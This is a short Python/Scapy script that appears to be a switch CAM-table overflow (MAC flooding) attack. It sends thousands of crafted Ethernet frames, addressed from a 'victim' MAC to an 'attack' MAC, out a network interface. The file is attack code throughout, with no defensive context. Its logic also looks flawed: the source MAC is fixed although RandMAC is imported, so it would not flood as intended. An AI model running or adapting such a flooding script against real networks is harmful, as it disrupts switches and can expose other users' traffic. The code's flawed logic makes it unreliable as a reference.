#!/usr/bin/env python
from scapy.all import Ether, IP, TCP, RandIP, RandMAC, sendp

mac_attack = "XX:XX:XX:XX:XX:XX"
mac_victim = "XX:XX:XX:XX:XX:XX"

def generate_packets():
    packet_list = []
    for i in range(1,10000):
        packet  = Ether(src = mac_victim, dst= mac_attack)/IP(src=RandIP(),dst=RandIP())
        packet_list.append(packet)
    return packet_list

def cam_overflow(packet_list):
    sendp(packet_list, iface='eth1')

if __name__ == '__main__':
    print(mac_attack)
    print(mac_victim)
    packet_list = generate_packets()
    cam_overflow(packet_list)
